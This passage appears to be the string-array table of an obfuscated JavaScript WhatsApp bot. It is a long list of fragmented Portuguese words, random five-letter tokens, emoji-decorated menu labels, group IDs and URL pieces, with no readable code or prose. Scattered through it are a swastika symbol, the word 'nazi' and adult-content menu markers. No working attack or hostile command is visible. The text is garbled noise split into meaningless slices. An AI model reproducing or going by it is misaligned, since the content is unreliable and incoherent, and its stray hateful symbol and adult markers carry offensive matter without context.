A", "ida n", ", des", 'uvcak', "na ru", 'iver:', 'mePQt', 'YfVwi', 'gSUPh', 'ETRfH', 'KeqoM', " RESE", 'Styjb', 'xwwDZ', " não ", "𝐔𝐓𝐒𝐔 ", 'lNZaP', 'wAfiU', "oto p", '16f75', " exec", 'blema', 'iho', "s Fak", 'nXcDj', 'VMxed', 'KBmTr', 'YgNdh', 'entra', "KK\n\n-", 'hamen', 'g.wha', 'nUVNf', 'cbsoa', 'zVvYl', 'TiTFH', 'mt2', 'TIVAR', " únic", 'XWpBt', "*\n• D", 'iptio', 'CLdZO', 'JtQLC', 'BCmUA', 'FvTzT', "𝐐𝐔𝐄𝐌 ", "rde o", 'LLhPe', "bug \"", 'hdDsj', '.7,as', '://it', 'hiBsF', 'wpwKm', 'cetão', 'TEFVE', 'RyN3J', "a fei", 'fecha', "MOS T", 'HUkiO', 'zJfsn', " OTAR", 'BjSQW', '.y=-6', 'MqrZz', 'INArK', 'dono5', "er ne", "2 tod", "tico ", 'JLQbl', "ada c", 'WnyPs', 'migo(', 'IMEab', 'THwJZ', 'RlSuo', 'nção.', 'WulUP', 'onary', 'XFPRh', "7. 🕹️ ", 'Escud', 'jMdhw', 'qREnW', "🔥 𝐏𝐑𝐎́", 'pbeUB', "𝐑𝐔 ❄️", 'dZUTZ', 'WPKIQ', 'MJuxs', "*2 - ", 'Ngldf', 'Btgkf', '-da-s', 'PsbzB', " dign", "*\nQua", "ro?\n\n", 'EDpqW', 'fórma', "O hor", "com e", 'deYsV', 'pkBLa', 'siYfq', 'isar', 'xwuZA', 'ihIUJ', 'CB:ca', 'aeHQW', 'SuisA', 'WewDW', "a vez", 'OlkpP', 'oadTo', "r use", "s ric", 'jrpBD', 'HTRKI', 'eRoch', 'NjuQi', 'stag/', "B)\nht", 'rdamo', 'RegMU', "\n│‣🌡️ ", 'RYFGI', 'fvknd', 'hyRRY', "e: wa", 'lHnrv', 'UfzzF', 'er-st', 'bjLgJ', 'OFNtz', '(OBS:', " SCHO", 'zISlT', 'ar_go', 'tivo', "lta, ", 'neong', 'douMu', 'uKuCD', 'udOyr', " ]\n\nU", 'MaPiP', 'GRING', 'BCQre', 'MjPtC', "te ni", 'CJmeZ', 'vídeo', 'wgxTz', "\n▢ *D", 'Envia', 'uguel', 'lrjSi', 'sJson', 'cqgaP', "k que", 'VELHA', 'bSjuF', 'kmafF', 'cDofw', 'bolCf', 'Bqttb', 'mFJZp', "o, pa", 'yUJyi', 'MabFO', 'CTWnG', 'XBkuo', "ta 卐", "\nPeso", 'SeIMV', '4|10|', '0f346', 'rinha', 'eoVfF', 'fastv', 'PdpEQ', "NTE O", '@g.us', 'PRtzo', 'zlokU', 'dENHY', 'JInNb', 'HAnpA', 'CFPrc', 'fvNqz', "𝐈 𝐋𝐎𝐂", "ciso ", 'IXEFK', 'mium.', 'sgDYf', 'ErlMP', "\n*Fin", 'UAZgr', 'o%20', " Cone", 'IvgWo', "a é d", 'ZVRWS', '.colo', 'ftiOh', 'stick', 'NjZLP', 'jrJRt', "𝐔𝐓𝐎𝟐 ", 'KvIui', 'GsgLu', "go 0", 'zBtkN', 'stou,', 'dTqKT', 'sQiHJ', 'YtNUn', " RENG", 'ueada', 'dmiEV', 'VwhpF', 'BWWpR', " ( ", 'iqQXZ', 'GzYwS', "s a c", ".\n\nTu", 'igare', "de CP", " 🎉", "nu _-", 'ponto', "ue al", 'da(s)', "u moe", "r a a", " a: ", '57398', 'r..._', 'GeDol', 'QxMDz', 'bSCUL', 'wgRZo', 'tunid', 'EMMuB', "URL f", 'shipp', 'QSpAs', 'mGqsD', 'plvr', 'cobra', "Olá ", "\n\nPas", "36. ❄️", 'esPel', 'Agora', 'EDPBU', 'qMjPH', "𝐍𝐄𝐙 🔞", 'CvRVI', 'dcdcq', 'EggOG', 'zMhmQ', "s ave", 'aCReC', 'pJjPB', 'qDPpz', 'yVpcc', 'VcRpF', 'XzAQR', 'xRfAw', 'amoun', 'DfsMH', '2|1|3', "om nú", "ÕES D", "upo e", '0.121', 'ggWDs', '```✓M', 'bXaYr', 'azhkP', 'uscar', "cê ir", "o for", "r ace", "to in", "❄️ 𝐒𝐄𝐈", 'sgRC4', 'oopa', 'blmBM', 'missã', 'bBFJr', 'ZytBn', 'dmDic', 'kQdpt', 'anhou', 'gif/a', "a lib", "e bem", 'KBTwR', 'VilTs', 'QsQTA', " tenh", 'legal', ", Usu", 'HhdEO', 'Hdscj', "IS HE", 'wCOVQ', ':g=15', 'stts', ", fal", 'DQySW', ". Não", 'kBphT', "de co", "h Ban", 'nonOY', " GAMO", 'HhgYB', '1|7|2', '𝐎🔥', 'zJhvy', " core", 'ctOwn', 'GZYOY', "r. Te", 'adcas', 'ojDIz', "\n\n - ", "️ 𝐋𝐈𝐒", 'JhuAh', '4P76C', 'm...*', 'QHirm', 'udica', 'LAiii', " em ", 'line:', 'spp', 'vbCCA', "l sol", 'LNGeb', 'icion', '|2|1|', 'LHTfk', 'eHgwK', 'les', 'nnddm', 'OZplS', "ro ,(", 'BYhXA', 'dGToo', 'pVaUv', 'JjDDV', 'JDXEd', '://ti', 'eWrit', 'iiywW', 'lizar', "sa é ", 'eJid', 'luOOi', 'TpWVu', 'QTVYm', 'es%20', "para ", " estu", 'lhas.', 'MSdHM', 'LXMmI', " ) gr", 'xvUyP', "🔞 𝙀𝙂𝙍", 'oFcmS', 'wAHat', 'lkikC', 'WZbuO', 'tário', 'CXgKG', 'tNUjX', 'Rudml', 'hD9Hg', 'SBxdn', 'esour', "um no", ".\n\n@", "ds, a", 'uhoQz', 'MNnak', " pare", "ar o ", 'OXoXC', 'KscVi', "a:* *", 'RBZeF', "o bat", 'NylcA', 'EXpvI', 'sroiV', "car n", '.outl', 'PpwBA', " DESA", "╏❆ *V", "r no ", " Anti", 'BSgqP', 'aZcGt', "ink: ", "de to", 'tGvHv', " 𝐀𝐍𝐈𝐌", 'jogo7', 'MZiqj', 'lfytx', "dos U", 'yXHeJ', 't1000', 'daUPf', 'rUFEM', "á nas", 'dIdCV', "no : ", 'qvklh', 'YKvtv', 'vez!', 'SGMkE', 'CWtIc', 'ente*', "❆̸̸͙⃰ ⃝⃔͜💎", " Pesq", 'lnRWV', " códi", 'xobSD', '399', "70. ❄️", 'rcach', 'LtUnX', "rão d", 'onfYi', 'uWyHw', 'fMJlE', "ída d", 'TYnZo', 'dWAHZ', 'ame', 'asLkG', 'adro', 'conté', 'NwZQP', "o BOT", 'PADUI', "or su", 'EGkLM', " Quan", "😈 _Vo", 'echam', " DO K", 'ker._', 'qgOro', 'vjzly', "\ncaso", 'kjnSn', 'gos/I', 'gnYSk', " Por ", 'nco', "2 em ", 'rPLan', " os c", "ite f", "20\n\nc", 'QgByV', "TE NO", "io ne", 'FiTLB', 'CGamo', 'kWHBv', 'hkysQ', 'KAIpB', "upo 📝", 'OUVDF', "3 - N", "... P", "iada ", 'eKPWl', 'wnloa', 'TfemH', 'OOZZM', 'mVsvU', 'ed0b9', "🧡 MET", 'LAbIB', 'jequi', 'Diver', 'JQbym', 'daXJH', 'PpKgZ', 'blox', "OS FE", 'singl', 'jRyuJ', 'MMWJK', "🔞 𝐍𝐄𝐆", 'stk', 'pardo', 'pSuSc', 'DAFYw', 'VILGy', 'sao?', 'hool+', 'vVVUw', "o e r", '09247', 'BegZd', 'pXRqn', 'LEVEL', ". Cas", 'nlVLu', 'fyXAU', 'ssoa/', 'PgXUC', 'títul', 'OhJxj', 'ngwmN', " KKKK", "uma t", 'WIigj', 'DhCDM', " INIC", 'dsmMM', 'CNWBd', "m Suc", "𝐀𝐒𝟑 ❄️", 'UUAMn', 'oroa', 'dia.', 'TqIWL', 'cause', 'KbmoH', 'Onlin', "ade e", 'VgbXm', 'BwpYI', "\n┊ Re", " [❗] ", 'nue', 'JXMrn', "zada ", 'TEEkj', 'ZVoVX', 'lWzYM', "a no ", '𝐨𝐭𝐮𝐬᭄', 'BkyJA', 'LrTGl', "ig he", 'SxjuN', "um us", 's/Por', 'zPywg', 'b464f', "dio ", "e ini", 'cmMjn', "𝐋𝐄 𝐃𝐄", 'rowId', "TE MA", 'taWxv', 'PCvXw', 'mar/%', "Ah, q", '6|4', 'KOwtg', 'uanta', 'GXYQK', 'ssíve', 'kMkgb', '2*PTS', 'qdmEZ', 'PdeDu', 'vvUTk', 'oxwoP', 'OUGSB', "oi at", "e A:*", "ɪɢᴀ📵\n", 'WbWHl', 'pPPYd', 'oken=', 'zcUxk', 'DBFlN', "- Exe", 'HcUDP', " -i ", 'ɴʜᴇɪʀ', "rio j", 'ora:m', '所有的宝⻉', 'UqILO', 'hruqR', 'qwIjp', 'error', "ar te", "PK:\nh", "18. ❄️", 'stant', 'swfTw', 'UIVJY', 'GrxAE', "u ami", 'CaTFC', 'addgo', "HER ❄️", 'UAgrh', 'BhPBT', 'rouba', 'eLOYk', "e alg", "ts wa", " ação", 'aDyWo', "98. 🔞", "] Mar", "se: i", 'EMPAT', 'ITdZR', "O -_\n", 'qGauP', "udas ", "LEI∆ ", 'OAypm', 'Srihy', "nto X", "O usu", 'aACYb', ". @", 'xXwwB', 'YgjYg', " o az", 'OJuVR', 'OS/da', 'Mozil', '9c6aa', "Do Hy", "T (2)", 'tEemy', 'vqSmm', "á cha", 'xcept', '31c8a', "𝐍𝐎 𝐓𝐀", "guel ", 'keYMw', 's/Neg', '#1f2c', 'untas', 'iTYEX', "ico d", "❄️ 𝐍𝐎𝐄", 'te_De', 'mpate', 'ACwIC', " do q", "S VEZ", 'mXZGS', 'PDjTa', 'HJTVc', 'ShdYT', 'm+1.1', 'CgSvn', 'zKGzU', 'aEaqt', 'aitjQ', 'CVRyP', "r um ", 'ZVmuh', "e até", 'BAeHW', 'ZECoj', 'eStre', 'estan', 'Mande', "old q", '.0.ba', 'turas', "AÇÃO ", 'nnYrI', "ra di", 'bEWkL', 'gente', 'pE_ho', " 🇩 🇪 ", '291457AinSEK', 'DDKuD', 'MGwAw', 'arfor', "or: ", "ndo *", "itou ", 'VPgYt', 'dIFXz', 'Limit', "el: ", 'Hebfj', 'ood.j', "p 4k", 'CRxoD', 'jxBMx', 'czyqe', 'bass2', "na! 🙃", 'sPqqQ', 'KYgLL', 'HDlhj', 'bebed', "55 21", 'yKogZ', "\n_*Ex", 'jPNmf', 'kIkHy', "ISAS ", '1/2', 'ter:a', "ue tr", " e eu", "~\n\nIr", 'xLYlV', 'mEGGU', 'YYTaW', "ta go", "até a", 'kPFgK', 'lnBgD', 'zuko', 'OTNmv', "(4)\n1", 'HwMNw', "le um", 'wEPBn', 'qfrwf', '1/sd1', "ero q", 'quADU', 'qhLaK', 'howMB', 'myMtW', 'IREoZ', '𝐍𝐔́𝐌𝐄𝐑', 'tFJeV', 'Númer', "24. 🔞", 'lEEUh', 'XBbSF', 'iado.', " Cons", 'cdefg', 'ghhEr', 'rhWLu', 'gTnuN', 'yrSZW', 'gFdHq', 'BTNbi', 'frleq', 'dCxrL', 'CAEFp', "4. 🕹️ ", '0|1|2', 'lGLSy', "o del", 'tNwiz', 'conso', '2.0&t', 'eolgm', 'gvykn', 'BLTnv', "𝐑𝐓𝐄 𝐃", 'TRKzq', "😈 *_A", 'YtOTj', 'ZPYFG', 'BQnfY', 'KTjFc', 'phxGD', "lá te", 'ot+Mo', 'ca6f4', " opor", "\n 「 @", 'kCaBD', "com s", "á O M", " data", 'ZEqZZ', 'vfFYq', 'ufvEh', 'TlByr', "EM ER", 'sGSOB', " a jo", " do D", 'llQgR', 'WSHft', 'ostre', 'yuNcv', 'necid', 'wxUEs', "on re", 'kuqGv', '+5521', "erá f", 'minat', 'eiUwF', 'tir', 'FWYLJ', 'yuKrB', 'qexkm', "r, pe", " dada", '𝐀𝐋𝐓𝐄𝐑', 'TmhNE', 'kkBdd', 'dl-me', 'Ldryw', 'ffYyE', 'oCyeo', 'gKCLG', "❄️ 𝐆𝐘𝐎", "ca co", "tre 1", 'izeH', '299', "/1\n║\n", 'CXYDd', 'PoHbT', 'XCpWI', 'nuir,', " a co", " o si", 'VeQYr', "AS DO", 'Lcwie', 'jllXx', 'Aphzu', "s jog", 'SFtvV', 'EEwmR', "das +", "r / 0", "𝐍𝐄 𝐅𝐎", 'mAAOD', 'WHkgu', 'HFxOs', 'mbros', 'FDewG', " 𝐋𝐄𝐓𝐈", 'aLoJv', 'G.fin', 'EPFIS', 'ync', 'EEByZ', 'tOeGS', 'propo', 'JDnFU', "g Par", 'fekKK', 'hters', "\nHorá", 'MvZUw', "ts ka", 'vGJyq', "🚀\n   ", "cê de", '_sde_', '965e8', 'rro:', 'yYhZk', "te (n", 'CFPmq', 'pesqu', 'BIniw', 'yrxwJ', 'ufFEE', "o seu", 'tlnUq', " curt", 'ífico', 'eniza', 'WMogd', 'reen', "𝐋𝐎 🟡\n", "eu um", 'ori', 'FNngY', "ele f", 'ídeo.', 'brinc', 'GPS', 'PrQop', 'var3', "tido ", "ocê d", "🎉*\n\n*", "17. 🔞", 'JYDZM', "e\n\n©b", 'obrin', 'XKDTj', "❗❳ *L", "o sup", "0000 ", "r adi", "🇯🇵 𝗔𝗡𝗔", 'op=ur', " ⸙. ͎۫", 'pshzp', 'HCLAz', "ano?\n", 'WLdQs', 'aBotR', '0|2|1', 'ImZpq', "ERAO ", 'o_typ', "le ut", 'ANSMI', 'compe', 'zExFJ', '】🥂', 'CbBaZ', 'bHLgm', "os ", 'subst', 'Mjfwd', 'packr', 'on/TA', 'TqxRQ', 'Marqu', 'elQsR', "ê des", "𝗧𝗢𝗚𝗘 ", 'sura*', 'mBAjd', 'áver,', 'ntinu', " pela", " cu|5", 'userI', 'SonXv', 'lusa,', "ido. ", 'GvwKa', "inda ", '0/2', 'hPsBy', 'oDvHX', '(1).j', 'acc63', "OS GR", 'ite@0', 'devid', " roub", 'eIVfA', "umiu ", 'dWttz', 'kRPIk', 'knRhC', "𝐋𝐒𝐎𝐍 ", 'qCowc', 's;q=0', 'ghtEx', " sort", '&text', 'ZjSgJ', 'pabOV', 'iCHMU', "PIX D", 'crHrb', "ི⋮ ྀ ", 'GgClN', 'BEVpP', 'senho', 'HAqqv', 'ecLWM', "um Gr", " ) - ", 'MQeEh', 'gLDLA', 'rsplO', 'Aaaah', 'ELO/d', '-mens', 'TCDog', 'Adsxt', 'NdNKx', 'DYeyw', 'UGqaF', 'ptuAZ', " fone", '4m3mr', 'MpanK', "ig ki", ".\n\nwa", 'UtYlp', "m qua", 'BpfPU', '✼┉╝', 'ZTDVt', "ig gy", 'Himbi', 'oa/10', 'Nuniz', "ao ad", 'serve', "𝐎 𝐁𝐑𝐈", "\n\nE p", 'Deknq', 'SIDCC', 'ZFBew', 'nfqky', "em ma", '|4|6|', 'zvJqm', 'ijfBA', 'eEtwT', 'write', 'tante', 'MhATi', "to. P", 'lBzpc', 'LfZUx', 'uSrms', 'fUyqI', 'oModH', 'h/2)*', "ei ro", 'Dznfn', 'MnRbh', 'grils', 'HzHIG', 'jvpFg', "YBER ", "a açã", 'tBOCw', 'SORmJ', "al a ", "6) Ap", 'axRlD', 'XkrGx', "O DA ", ": Ban", 'KoPbw', 'zVUpi', "ara r", 'groun', " o se", 'SijEP', 'ARESF', 'ltado', 'NgScV', 'NqOSp', 'zhASK', "do fo", 'SAGel', 'word%', "cê nã", "ua so", "ra es", 'xDMKL', "nk ac", 'ACBLT', " bom ", "me um", 'CfWrD', 'lapIT', "\n©by ", 'figem', 'dYYDY', 'lLoiT', 'HSrHJ', 'a66b8', 'rhvYh', 'zLpTw', 'ziGAi', 'jPxiX', "ld va", 'ibXHV', "l Cha", " açõe", 'EQ0F4', "loc n", 'KGbjB', 'zlVpF', "𝐀𝐃𝐌s ", 'Emzxv', '┉✼┉═༺', 'asila', "aga d", "! 😅", "o ]\nD", 'sPpJG', "Só Ad", 'gsDfD', 'oKUZr', 'RFZhR', "r gol", "𝐈𝐍𝐊 𝐆", 'gkAMU', '🦹‍♂️', 'fFMzm', 'VCWop', 'pUbBH', "𝐄 🔞", 'Pvxnu', 'LpYZo', 'RtEWZ', 'pIFXs', 'ibIfu', 'swvdz', 'no..', 'IISMn', "ero p", "eço: ", 'RMuAy', 'oDGUB', '𝖲𝖤𝖱↯🍧', 'BCUSs', "nca m", "ece o", 'nDUtV', 'meiro', " NOEL", 'iVhdr', "orma ", 'mNlLT', "* Ex:", "o\nSe ", 'gvpTw', "Este ", 'XFYum', 'fegCs', 'srICl', ") ██▀", 'RiBiX', 'azLxf', "er se", 'IHNph', 't%20D', 'tkIHj', 'MYESA', 'Usbvn', " Java", 'tuir.', "ai ex", 'zcLFl', 'kwVCm', 'IBVtN', "or *", " HINA", 'AJyCL', 'pCymq', 'irado', "❄️ 𝐌𝐈𝐓", 'var5', "m cha", 'qczOn', "g: ", 'fvcRA', " FORT", 'dJqny', 'JBcWy', 'WtKcF', 'uCxlu', 'KpKye', 'TYagM', 'AdTxC', 'szCCO', 'quwNy', 'ihDtS', 'kBxmz', 'hXTlo', 'EDIDO', 'ww.me', ".\n\nSe", 'bDCvs', 'mGtmu', 'vAuAR', '1|5|6', "o é e", "👑 𝐌𝐄𝐍", 'cebeu', 'wqett', "ar\"!", 'RGqjB', 'Ksufh', 'FtWEL', '0|6|1', " vez ", 'perio', 'site', 'famil', "🖥️ Arq", 'usFvI', "𝐎 𝐌𝐞𝐧", 'oAbbV', 'yNWkr', "ar vi", "iou o", 'ﮩ٨ـ♡ﮩ', " o oc", 'CzwZa', 'infot', 'ddhfe', 'FTNSC', "s 1 /", 'ciarB', 'TWeNI', '999-9', 'HaFqt', '966bf', 'dd82b', 'MFPCK', 'gsofR', "ou ( ", 'ZZebO', 'VSPZD', "ama* ", 'GRPwW', "or:* ", "não p", 'gosto', 'UwBVd', "já es", 'OCyME', " Isa ", 'DdSNE', 'FaptH', 'JLYha', "nti P", 'yuri/', 'iLdSd', " De A", 'kybyO', 'kyPhT', 'BHLeK', 'JJKRa', 'gntKo', 'nNWqD', "*RAM ", "r míd", 'rGcIR', 'QopRG', 'mano?', 'JpJPQ', 'hDIHh', "sua v", 'ᴘʀᴇsᴇ', 'CaiqW', 'xpWVa', 'ShHEX', 'onsum', 'MzwAz', 'aluco', 'f=90:', 'iZDlY', "pos p", 'DWxcT', 'hKKLl', 'rmelh', "isso ", 'f6=40', 'jRwDf', 'EDUxf', 'iHdpO', 'IzkWC', 'yqupe', 'OS👥👤!', 'kReQr', 'AQHqI', 'le(a)', 'iwWDr', 'LOGOS', " de c", 'uery&', 'GiLKA', 'imc', "if co", " AJUD", '8L7CW', 'oMGuE', "com q", 'ZRkUD', " Gost", 'ANTAS', 'UxTLl', 'plukh', "bro c", 'fENqc', 'ORY_H', 'arity', 'infob', 'blish', 'time,', 'b690e', 'aAVCZ', "𝐇𝐀 🔞", "100\n\n", 'orgy/', 'XRyDG', 'rimas', 'PTTMI', 'verse', 'zebfw', ", não", "ve pa", '0NfrO', 'eto', 'bzOfT', 'AMjRj', 'bVxlr', "nha c", "a cac", 'IGDNm', 'ShgPN', 'gBqRP', 'qWvlv', 'IjYYu', 'sKWdu', "O* : ", 'prar,', 'Downl', "🔞 𝐂𝐂𝐋", 'Ipmdq', 'kLnue', 'tiplo', 'LgBEj', 'XdDuE', "𝐀 𝐋𝐈𝐒", 'Títul', 'todos', 'Suces', 'RyCOl', 'mind.', "ez, s", " do S", "as ne", 'OjAGG', 'figs2', '🙅🏼‍♂️️', 'UfXjA', "*\n*pa", "de, A", 'zVrdo', "0\n\nBe", 'weigh', 'SLUBZ', '3/3', 'pRKTH', 'JSoov', "ra a ", 'odPkE', 'c0095', 'jLTLN', 'FORTU', 'TQMDe', 'Hifsr', 'aviat', 'fffff', 'mo-ch', "🇯🇵 𝗔𝗬𝗨", 'yyWkR', 'DIGuW', 'zlmRB', 'rmina', 'raveR', "ra vo", 'WTWZD', '࣭ٜ❀۫◍', "𝐔 𝐋𝐎𝐆", "is de", 'GTiEf', 'eSubj', 'EXKhr', "S STR", 'ptibe', 'tivid', 'nVIou', 'iYXCV', "\n*│➥ ", 'DJRED', "👮‍♂️ 𝐌𝐄𝐍", 'SjihP', "em co", 'lgfeP', 'llers', 'aussQ', 'hkmoW', 'Hfcll', 'TEzwJ', "ê só ", "𝐑 𝐀 𝐓", 'FwzFi', "ado r", 'hqfnu', 'FmuRC', 'Tzzbw', 'nuYgG', "ao su", 'ia.', "as, p", 'Fight', 'sVkRX', 'hnuxs', "29. ❄️", "𝐎 ⚪\n", 'fjJSj', "ig na", 'tqVqV', " Hete", 'OSTSN', "*\n*PO", "ê pod", 'iliza', 'strua', 'ático', 'aHHxN', 'iKYkk', "stá j", 'qWOLw', "o gru", "mg 1 ", "\n║ 🔮 ", "34. ❄️", 'CeAZU', 'iWCWT', 'kMema', 'shQHt', "o, aq", 'noUnY', 'pmpTq', 'kRxQC', 'olds.', 'tAjlL', 'bpF8B', 'gaHAO', 'lopho', 'uploa', "mas t", "de tu", 'fajrc', 'are', 'JBJjt', "deu u", "em ", 'THV5x', 'iAGcC', ", \n", 'JBesj', 'jWBwg', "ver o", 'oaem7', "2. ❄️ ", 'BTswQ', '🔥𝐏𝐀𝐂𝐊', 'IZosi', "13. ❄️", 'QESWr', " Está", 'WbhOH', 'XKLXu', "upo r", 'c0eac', " e le", 'bqpPw', "icas ", 'ZpryL', " AGUA", 'mwqeg', 'wApOr', " ⚠️\n\r\n", 'KAakS', 'álida', 'TDNRO', "dm 😂", "9 999", 'pykFw', 'JLTcK', 'coCBC', " SPRI", 'f9c6d', 'zDppr', '𝐌𝐀𝐃𝐎𝐑', ": nen", 'XMUNA', 'SzYrB', "\n┞┧Co", " Isad", 'uYXJK', " ˶•̀ _", 'ing', "𝗠𝗢𝗥𝗬 ", "do ma", 'QXwmO', 'zGIGS', 'QmCKW', 'gosta', 'futeb', 'temp_', 'mqmvU', 'FrjOE', 'endad', "VER O", 'Dlsiy', 'jDqND', 'uv420', 'HwgML', "lie c", 'rXeOe', 'XdtCZ', " 😎👑\n", 'ORWTx', 'IIADv', 'mix', "r o j", 'VIgId', 'MGgcC', " SUA ", 'AYLhw', "💨\n   ", 'rvoct', 'Lbqhi', 'om.br', 'VxSQp', 'lengh', 'IMixK', "𝐇𝐀 𝐋𝐎", " 𝐚𝐭𝐢𝐯", 'MULAT', 'HHTBD', 'Oxxlx', 'VghjK', 'rqFcf', 'JdKdM', "m dia", 'RMoJM', 'fHvLm', 'sado.', 'IwbwY', 'CMBta', 'Bzprr', 'pbot', 'ojWbE', 'Hqoby', 'eJCcO', "rda d", 'regra', 'UkKfI', 'joRBD', 'ict', " insi", 'XNVoI', 'vpqdy', 'QpgrR', 'rwdfc', "aqui ", "𝐎 ✅", "isa s", 'UALIZ', "s na ", 'HYrNA', 'XEklK', 'escri', 'bYWNU', 'mg.cc', "do bo", "\n\n🕹️ C", 'ZPNBv', "ta ve", 'EYVmT', "⃰⃰\n╰╍❆", 'Dlzzu', 'IhTuC', 'fc619', " Thum", 'isual', "\n😈 *N", 'ite', 'aalgu', 'UDjZH', 'TOsvS', 'eFjuh', "el de", 'JuWGu', 'd93c4', 'WxcjV', 'xqWPp', 'hrp', '|Cach', 'espaç', "ODAS ", 'JzLEe', "e col", 'JTOyA', 'xtJmG', 'ta(s)', 'ljztl', 'receb', 'BoRtI', 'VHltb', 'xtaEf', 'gbIot', 'rycon', "pam 1", 'PYwby', "ou pe", 'wHJxq', '*Nenh', 'BgEEj', " pois", "SAR O", "do. (", 'IqYRs', 'play,', "ᴅᴇ Cʜ", "ter p", 'IYRZC', 'qVKIe', 'menu4', ", err", '0.out', 'NFblq', 'FExfi', "ou Do", 'pPuGU', 'aPiSm', 'elzfB', 'nth', "os jo", 'UJzUQ', 'Versã', "\n1 - ", 'untcm', "sa en", '2bfe5', 'bhXnd', '5RURv', 'yPIJE', 'amanh', 'lido.', 'amezf', 'nal_u', "cede ", 'aAnMs', '.watc', 'EgLZA', 'SmOWW', "MS 👩🏼‍✈️👩🏽‍✈️", "EIO 》", "map \"", 'ebVbW', '2&tex', 'qgiDR', '🥵*', 'utado', 'ifLhz', 'AFwQt', 'nform', 'Njwbi', 'hHtMc', 'Vezes', " 𝐕𝐞𝐫 ", 'rMBDG', 'bBGmN', 'LGLxv', 'WKuhZ', "cê é:", 'rrnQX', 'YBHtj', "❄️ 𝐆𝐔𝐍", '*RENO', 'EFQBf', 'xMMHp', "ia us", 'sende', 'infoe', 'ar.', 'VVVUB', "S FIG", 'ISTjt', 'eters', 'XXKne', 'jicne', " : ", "da se", 'QSmHD', 'dvCZf', "é nos", 'CfyaW', '🔥𝐕𝐈𝐃𝐄', 'klRHX', 'RaJno', 'lfogB', 'SjlrV', 'ptt', 'MENTO', 'IgcSo', 'pxkRC', 'LARZY', 'FcOlA', " Hard", 'lodan', 'mwPiM', "RAMA ", 'FNfya', 'NAwRD', 'pimWC', "ot fa", 'KHgmB', 'NVdCm', 'ogoda', '𝐍𝐎𝐁𝐔𝟐', 'LdQGj', "🇯🇵 𝗜𝗧𝗔", 'zMwxb', 'b705c', 'DTnsL', 'oFvmn', 'sbxEz', 'pEAIk', 'ZjAWl', 'pXcww', "s as ", "io a ", 'VREYn', '244:+', 'ifica', 'Yszvb', 'EflsF', 'BpbBd', " util", 'OHkjH', 'QCxUo', "o que", 'preso', 'xKsIp', 'sHSQz', "nce d", 'GTrHG', 'ivo.', "ra ve", 'MsyBM', 'ligaç', 'encim', "um Me", "ir sp", 'whats', 'DgYWf', 'JeXTy', '*HORÁ', "27. 🕹️", 'wZYnL', "do go", 'qoabj', 'PAAoz', 'krgsl', 'gaTjk', "i est", 'jvtpq', 'iaEer', "NE* 🤖", 'MOiHS', 'bf465', "e Par", 'RkqCw', 'hjKCV', 'rankp', 'bnmXW', 'FUCsX', 'kXZYB', 'coQjB', "ele g", 'DrTTv', '0nM.e', 'rador', 'CxsBB', 'uLXKB', "𝐓𝐇𝐄𝐑 ", "𝗛𝗢 🇯🇵", 'bjTjw', "OR UT", "m din", 'FNCke', "os:* ", 'Coron', 'YfpcQ', 'cvoPm', " pão,", " de n", '/pala', '𝐄𝐕𝐄𝐋𝐈', 'ebd59', 'PgWBF', 'lgNJv', "r o p", 'BGwFw', 'jsons', "ivo, ", "e o 3", 'etrat', 'Menu', 'livPa', 'RgCkj', " deu ", 'ZAHMI', 'aHAnZ', "der n", 'wKdMc', 'nOmjy', 'mbro:', 'ontem', 'zEAfS', 'Jzpor', " nazi", 'Dphfu', 'ekLdD', "ais a", 'GgZlQ', 'pegue', "á\n├ b", 'NMwyM', 'd=1d0', 'anula', 'TlCeX', 'jmgXf', "\n\n*🥳 ", "cado ", "uem a", 'VqkgR', 'EUEea', " chav", 'vtBUv', "💥 *CA", 'XzZWS', 'BBsDK', "SÃO D", 'enhum', 'DuRtY', "ir, p", "ize: ", 'Cᴏɴᴄʟ', 'fYQQZ', "𝐈 𝐅𝐈𝐆", 'RyzeB', 'ogado', 'GgYJg', 'VYPpU', 'QVqnl', '0sGhf', 'KYYbe', 'reduz', 'UfOnH', "\n*• C", "❄️ 𝐋𝐄𝐕", 'TdDke', 'Vjcdh', 'ZHzzs', " 25 G", 'ozmSn', 'uTMQs', 'ebEyT', 'bMzBp', 'xt.0.', ": o r", " atlâ", "\n\n🕹️ B", 'meXdJ', 'LbnHk', "❄️ 𝐅𝐑𝐀", 'UnWYt', '4|6|0', 'vnZgt', 'AYGcy', 'forja', " sobr", 'msg', 'MFqLj', 'WBmFI', 'kdYlW', 'itag', 'point', "eu có", "𝐈 ❄️", 'CDgNG', 'PinIn', " JAIS", "\n\n©by", 'znOst', 'kAWEI', 'YOkRg', "LEO\nh", 'celam', " (núm", " dire", 'codeP', 'VWOQp', 'yCspm', 'YfCCx', 'ase', 'HHeKy', "𝐇𝐈 ❄️", "❄️ 𝐒𝐀𝐈", 'WGEiQ', "ias\n1", "PA ❄️\n", 'afio.', 'otify', 'cvUZH', "A ACO", '🍧【✔】ɢ', 'WlQGV', "sas l", 'vfeok', 'qXoCO', "ia. P", 'UEzYG', 'EIsmS', 'KfoAU', '───*', 'VHZLS', 'tivar', "ig sa", "nhas ", 'tica', 'oMuGB', 'xKBSp', "𝑡𝑒𝑚 𝑙", 'HziLm', 'XvbAA', 'ar-ab', 'tvxjT', 'IJdtT', 'Passe', "zou o", 'DWYLx', 'elPcP', 'deIso', 'njieS', "o se ", '-temp', 'mMbEK', 'charC', 'wqvhq', 'Index', 'uCqvJ', 'oBot', 'mGold', 'FuWQL', "U:* ", 'OhrGR', 'eUuCj', 'wStPN', 'jogan', 'RDjWH', 'ca.', 'vtQoT', 'RaNCE', " Stee", "akes ", 'NQUFf', 'FTCLP', 'fd0ce', 'nPrQl', "r o u", 'BLFkf', 'dswna', 'cCmeB', 'YAavc', 'pXCbe', 'ROKEG', 'bAplo', 'eitar', 'ZnhQr', 'dQlHz', 'ZLqqY', "onta\n", '*Qual', "dots ", "ode l", 'ee26e', 'YxTQd', 'UCESS', 'hBist', 'nXqHi', 'NGTAY', 'Wigeo', 'BAPvf', 'ceitá', '23819', 'mOrZT', "\n\n✧ L", "𝗘𝗞𝗢 🇯🇵", 'rjGYe', 'GQemo', 'OkcEA', 'rgunt', 'nGmcl', 'erest', 'QnfQd', 'cVBGH', 'EqvPN', 'ionum', 'uJRBv', 'PZsvy', 'btraí', 'IQECn', 'joinA', "le ja", 'ZOpnc', " Cybe", "ao: ", 'lEZmG', 'gIlDm', 'GPaJp', 'zLtrq', 'gnwFY', 'WJNNI', "❆╍╮\n╏", 'RAGON', 'xpess', "MI ❄️\n", 'KQieA', 'YHpoa', ". TEN", 'yFBxB', 'ão..', 'palav', 'tDDLc', "t mui", 'qowKG', 'ouTub', 'obal', 